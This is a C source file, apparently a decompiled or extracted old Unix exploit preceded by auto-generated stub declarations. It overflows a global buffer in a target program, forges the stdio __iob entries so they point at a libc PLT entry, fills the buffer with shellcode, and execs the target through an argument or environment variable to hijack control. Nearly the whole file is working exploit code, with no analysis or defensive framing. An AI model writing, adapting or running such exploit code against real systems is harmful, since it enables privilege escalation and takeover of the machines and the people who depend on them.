#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  scalar_t__ u_long ;

/* Variables and functions */
 int EOF ; 
 char* PLT_SYMBOL ; 
 scalar_t__ execv (char*,char**) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,char*,...) ; 
 int getopt (int,char**,char*) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  meow ; 
 int /*<<< orphan*/  perror (char*) ; 
 scalar_t__ plt_offset (char*,char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 char* prog ; 
 int /*<<< orphan*/  putenv (char*) ; 
 int shell_len ; 
 int /*<<< orphan*/ * shellcode ; 
 int /*<<< orphan*/  sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 scalar_t__ strcmp (char*,char*) ; 
 size_t strlen (char*) ; 
 char* strrchr (char*,char) ; 
 scalar_t__ strtol (char*,char**,int /*<<< orphan*/ ) ; 
 scalar_t__ strtoul (char*,char**,int /*<<< orphan*/ ) ; 
 scalar_t__ symval (char*,char*) ; 
 int /*<<< orphan*/  usage () ; 

main(int argc, char **argv)
{
char *env = NULL;
char *library = "/usr/lib/libc.so";
char *function = "_exithandle";
u_long off, uoff = 0;
u_long libaddr, pltaddr, bufaddr, iobaddr;
u_long pltent;
char *prognam, *bufnam;
int buflen;
char *badbuf;
u_long *bp;
int c;
extern char *optarg;
extern int optind;
char **arg0, **arg;

prog = strrchr(argv[0], '/');
if (prog)
++prog;
else
prog = argv[0];

while ((c = getopt(argc, argv, "l:f:o:e:")) != EOF)
switch (c) {
case 'l':
library = optarg;
break;
case 'f':
function = optarg;
break;
case 'o':
uoff = strtol(optarg, (char **)0, 0);
break;
case 'e':
env = optarg;
break;
default:
usage();
}

if (argc - optind < 3)
usage();

bufnam = argv[optind];

/*
* This is the address that the library in which `function'
* lives gets mapped to in the child address space. We could force
* a non-privileged copy of `prognam' to dump core, and fish
* out the memory mappings from the resulting core file; but this
* is really something users should be able to do themselves.
*/
libaddr = strtoul(argv[optind+1], (char **)0, 0);
if (libaddr == 0) {
fprintf(stderr, "%s: impossible library virtual address: %s\n",
prog, argv[optind+1]);
exit(1);
}
printf("Using library %s at 0x%p\n", library, libaddr);

prognam = argv[optind+2];

arg0 = &argv[optind+3];

/*
* `pltaddr' is the offset at which the library's PLT will be
* at from `libaddr'.
*/
pltaddr = symval(library, PLT_SYMBOL);
if (pltaddr == 0) {
fprintf(stderr, "%s: could not find PLT offset from library\n",
prog);
exit(1);
}
printf("Using PLT at 0x%p\n", pltaddr);

/*
* `off' is the offset from `pltaddr' in which the desired
* function's PLT entry is.
*/
off = plt_offset(library, function);
if (off == 0) {
fprintf(stderr, "%s: impossible offset from PLT returned\n", prog);
exit(1);
}
printf("Found %s at 0x%p\n", function, off);

/*
* `bufaddr' is the name (or address) of the buffer we want to
* overflow. It's not a stack buffer, so finding it out is trivial.
*/
if (bufnam[0] == '@')
bufaddr = strtol(&bufnam[1], (char **)0, 0);
else
bufaddr = symval(prognam, bufnam);

if (bufaddr == 0) {
fprintf(stderr, "%s: illegal buffer address: %s\n", prog, prognam);
exit(1);
}
printf("Buffer at 0x%p\n", bufaddr);

/*
* `iobaddr' is obviously the address of the stdio(3) array.
*/
iobaddr = symval(prognam, "__iob");
if (iobaddr == 0) {
fprintf(stderr, "%s: could not find iob[] in %s\n", prog, prognam);
exit(1);
}
printf("iob[] at 0x%p\n", iobaddr);

/*
* This is the absolute address of the PLT entry we want to
* overwrite.
*/
pltent = libaddr + pltaddr + off;

buflen = iobaddr - bufaddr;
if (buflen < shell_len) {
fprintf(stderr, "%s: not enough space for shell code\n", prog);
exit(1);
}
if (env) {
buflen += strlen(env) + 5;
if (buflen & 3) {
fprintf(stderr, "%s: alignment problem\n", prog);
exit(1);
}
}
badbuf = (char *)malloc(buflen);
if (badbuf == 0) {
fprintf(stderr, "%s: out of memory\n", prog);
exit(1);
}

if (env) {
buflen -= (strlen(env) + 5);
sprintf(badbuf, "%s=", env);

bp = (u_long *)&badbuf[strlen(badbuf)];
} else
bp = (u_long *)badbuf;

buflen /= sizeof (*bp);
for (c = 0; c < shell_len; c++)
*bp++ = shellcode[c];

for (; c < buflen; c++)
*bp++ = meow;

/*
* stdin -- whatever
*/
*bp++ = -29;
*bp++ = 0xef7d7310;
*bp++ = 0xef7d7310 - 29;
*bp++ = 0x0101ffff;

/*
* stdout
*/
*bp++ = -29;
*bp++ = pltent - uoff;
*bp++ = pltent - 29;
*bp++ = 0x0201ffff;

/*
* stderr
*/
*bp++ = -29;
*bp++ = pltent - uoff;
*bp++ = pltent - 29;
*bp++ = 0x0202ffff;

*bp++ = 0;

printf("Using absolute address 0x%p\n", pltent - uoff);

/*
* Almost ready to do the exec()
*/
if (env)
putenv(badbuf);
else
for (arg = arg0; arg && *arg; arg++) {
if (strcmp(*arg, "%s") == 0)
*arg = badbuf;
}

printf("Using %d bytes\n", buflen*4);

if (execv(prognam, arg0) < 0) {
perror("execv");
exit(1);
}

}